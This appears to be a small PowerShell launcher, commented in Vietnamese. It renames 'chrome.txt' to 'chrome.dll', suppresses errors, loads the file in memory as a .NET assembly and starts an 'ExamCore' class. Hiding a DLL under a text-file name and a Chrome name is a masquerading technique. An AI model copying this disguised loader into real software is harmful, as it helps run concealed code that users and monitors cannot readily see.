# Chrome DLL Launcher for PowerShell
$ErrorActionPreference = "SilentlyContinue"
$txtPath = Join-Path $PSScriptRoot "chrome.txt"
$dllPath = Join-Path $PSScriptRoot "chrome.dll"

# Bước 1: Nếu có file chrome.txt thì đổi tên về chrome.dll
if ((Test-Path $txtPath) -and -not (Test-Path $dllPath)) {
    Rename-Item -Path $txtPath -NewName "chrome.dll" -Force
}

# Bước 2: Nạp chrome.dll vào RAM và khởi chạy
if (Test-Path $dllPath) {
    [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
    [ExamCore]::Start()
} else {
    [System.Windows.Forms.MessageBox]::Show("Không tìm thấy file chrome.dll tại: $PSScriptRoot", "Lỗi", 0, 16)
}
